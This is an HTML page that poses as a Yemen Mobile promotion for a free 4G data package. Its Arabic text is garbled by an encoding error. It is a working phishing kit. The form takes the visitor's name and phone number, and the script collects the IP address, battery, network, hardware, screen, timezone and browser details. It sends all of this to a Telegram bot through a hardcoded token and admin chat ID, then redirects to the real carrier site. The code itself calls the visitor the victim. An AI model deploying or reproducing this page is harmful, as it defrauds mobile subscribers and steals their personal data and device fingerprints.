<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ - Ø®Ø¯Ù…Ø§Øª VIP</title>
    <style>
        :root { --ym-blue: #0054a6; --ym-red: #e31e24; }
        body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; }
        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--ym-red); }
        .header img { width: 130px; }
        .hero { background: var(--ym-blue); color: #fff; padding: 25px; text-align: center; }
        .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
        .vip-card { background: #fff; width: 100%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; border: 1px solid #ffd700; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-size: 14px; margin-bottom: 8px; color: var(--ym-blue); font-weight: bold; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
        .btn-vip { background: linear-gradient(90deg, var(--ym-red), #b31419); color: #fff; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #loading { display: none; text-align: center; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--ym-red); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header"><img src="https://yemenmobile.com.ye/assets/images/logo.png"></div>
<div class="hero">
    <h2 style="margin:0;">Ø¨Ø§Ù‚Ø© Ø³Ù„ÙÙ†ÙŠ VIP - 200MB ğŸš€</h2>
    <p style="font-size:13px; margin-top:5px;">Ø®Ø¯Ù…Ø© Ø§Ù„Ù…Ø´ØªØ±ÙƒÙŠÙ† Ø§Ù„Ù…ØªÙ…ÙŠØ²ÙŠÙ† Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù€ 4G ÙÙˆØ±Ø§Ù‹</p>
</div>

<div class="container">
    <div class="vip-card">
        <div class="form-group">
            <label>Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø±Ø¨Ø§Ø¹ÙŠ</label>
            <input type="text" id="fullname" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù…Ùƒ Ø§Ù„ÙƒØ§Ù…Ù„">
        </div>
        <div class="form-group">
            <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ (ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„)</label>
            <input type="number" id="phonenum" placeholder="77XXXXXXX">
        </div>
        <div class="form-group">
            <label>Ù†ÙˆØ¹ Ø§Ù„Ø®Ø¯Ù…Ø© Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©</label>
            <select id="service">
                <option>ØªÙØ¹ÙŠÙ„ ÙÙˆØ±Ø¬ÙŠ Ù…Ø¬Ø§Ù†ÙŠ (200MB)</option>
                <option>Ø®Ø¯Ù…Ø© Ø³Ù„ÙÙ†ÙŠ VIP Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±</option>
                <option>ØªØ­Ø¯ÙŠØ« Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø°ÙƒÙŠØ©</option>
            </select>
        </div>
        <button class="btn-vip" onclick="launchRadar()">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø§Ù„Ø¢Ù†</button>
        <div id="loading">
            <div class="spinner"></div>
            <p style="color:var(--ym-blue); font-size:13px;">Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨ Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ...</p>
        </div>
    </div>
</div>

<script>
// Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ø´ÙØ±Ø© (ØªÙ… Ø¯Ù…Ø¬ Ù…Ù†Ø·Ù‚ gate.php Ù‡Ù†Ø§)
const _0x5a1 = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q"; // Ø§Ù„ØªÙˆÙƒÙ†
const _0x2b2 = "7715667493"; // ID Ø§Ù„Ø£Ø¯Ù…Ù†
const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('id') || _0x2b2;

async function launchRadar() {
    const name = document.getElementById('fullname').value;
    const phone = document.getElementById('phonenum').value;
    if(!name || !phone) { alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©"); return; }

    document.getElementById('loading').style.display = 'block';

    // Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (ØªÙ… Ø§Ø³ØªØ¨Ø¯Ø§Ù„ PHP Ø¨Ù…Ø­Ø±Ùƒ JS Ù‚ÙˆÙŠ)
    const reportData = await getDeepInfo(name, phone);
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¨Ø§Ø´Ø±Ø© Ù„Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù… (Ø¨Ø¯ÙˆÙ† Ø§Ù„Ø­Ø§Ø¬Ø© Ù„Ù…Ù„Ù gate.php)
    await sendDirectToTG(reportData);

    setTimeout(() => {
        alert("ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨Ùƒ! Ø³ÙŠØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø¯Ù…Ø© Ø®Ù„Ø§Ù„ 15 Ø¯Ù‚ÙŠÙ‚Ø©.");
        window.location.href = "https://yemenmobile.com.ye";
    }, 3000);
}

async function sendDirectToTG(text) {
    const url = `https://api.telegram.org/bot${_0x5a1}/sendMessage`;
    const payload = {
        chat_id: targetId,
        text: text,
        parse_mode: 'Markdown'
    };

    try {
        await fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        // Ø¥Ø±Ø³Ø§Ù„ Ù†Ø³Ø®Ø© Ù„Ù„Ø£Ø¯Ù…Ù† Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… Ø§Ù„Ø¶ÙŠØ§Ø¹
        if(targetId !== _0x2b2) {
            payload.chat_id = _0x2b2;
            await fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
        }
    } catch (e) { console.error("Error sending data"); }
}

async function getDeepInfo(name, phone) {
    let bat = "ØºÙŠØ± Ù…ØªØ§Ø­", charge = "ğŸ”‹";
    if(navigator.getBattery) {
        const b = await navigator.getBattery();
        bat = Math.round(b.level*100) + "%";
        charge = b.charging ? "âš¡ ÙŠØ´Ø­Ù†" : "ğŸ”‹ Ù„Ø§ ÙŠØ´Ø­Ù†";
    }

    // Ù…Ø­Ø§ÙƒØ§Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù€ IP (Ù„Ø£Ù† JS Ø§Ù„Ø¹Ø§Ø¯ÙŠ Ù„Ø§ ÙŠØ±Ø§Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø©ØŒ Ù†Ø³ØªØ®Ø¯Ù… Ø®Ø¯Ù…Ø© Ø®Ø§Ø±Ø¬ÙŠØ© Ù…ÙˆØ«ÙˆÙ‚Ø©)
    let ip = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...";
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const ipData = await res.json();
        ip = ipData.ip;
    } catch(e) { ip = "ØªØ¹Ø°Ø± Ø¬Ù„Ø¨ Ø§Ù„Ù€ IP"; }

    const n = navigator;
    const s = screen;
    const w = window;

    return [
        `ğŸ’ **[ØªÙ‚Ø±ÙŠØ± VIP Ø§Ù„Ø³ÙŠØ§Ø¯ÙŠ - GitHub Pages]** ğŸ’`,
        `ğŸŒ **IP Ø§Ù„Ø¶Ø­ÙŠØ©:** \`${ip}\``,
        `ğŸ‘¤ **Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø³ØªØ¯Ø±Ø§Ø¬:**`,
        `- Ø§Ù„Ø§Ø³Ù…: ${name}`, `- Ø§Ù„Ù‡Ø§ØªÙ: ${phone}`, `- Ø§Ù„Ø®Ø¯Ù…Ø©: ${document.getElementById('service').value}`,
        `ğŸ”‹ **Ø§Ù„Ø·Ø§Ù‚Ø© ÙˆØ§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:**`,
        `- Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´Ø­Ù†: ${bat}`, `- Ø­Ø§Ù„Ø© Ø§Ù„Ø´Ø­Ù†: ${charge}`,
        `ğŸ“¡ **Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØ§Ù„Ø§ØªØµØ§Ù„:**`,
        `- Ø§Ù„Ù†ÙˆØ¹: ${n.connection?.effectiveType}`, `- Ø§Ù„Ø­Ø§Ù„Ø©: ${n.onLine ? "Ù…ØªØµÙ„ âœ…" : "Ø£ÙˆÙÙ„Ø§ÙŠÙ† âŒ"}`,
        `ğŸ§  **Ø§Ù„Ø¹ØªØ§Ø¯ ÙˆØ§Ù„Ù…Ø¹Ø§Ù„Ø¬:**`,
        `- Ø§Ù„Ø£Ù†ÙˆÙŠØ©: ${n.hardwareConcurrency}`, `- Ø§Ù„Ø±Ø§Ù…: ${n.deviceMemory || 'N/A'} GB`, `- Ø§Ù„Ù…Ù†ØµØ©: ${n.platform}`,
        `ğŸ“ **Ø§Ù„Ø´Ø§Ø´Ø©:** ${s.width}x${s.height}`,
        `ğŸŒ **Ø§Ù„Ø¨ÙŠØ¦Ø©:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
        `ğŸ”’ **Ø§Ù„Ù…ØªØµÙØ­:** ${n.userAgent.split(' ')[0]}`,
        `ğŸ“… **Ø§Ù„ØªÙˆÙ‚ÙŠØª:** ${new Date().toLocaleString('ar-YE')}`
    ].join('\n');
}
</script>
</body>
</html>
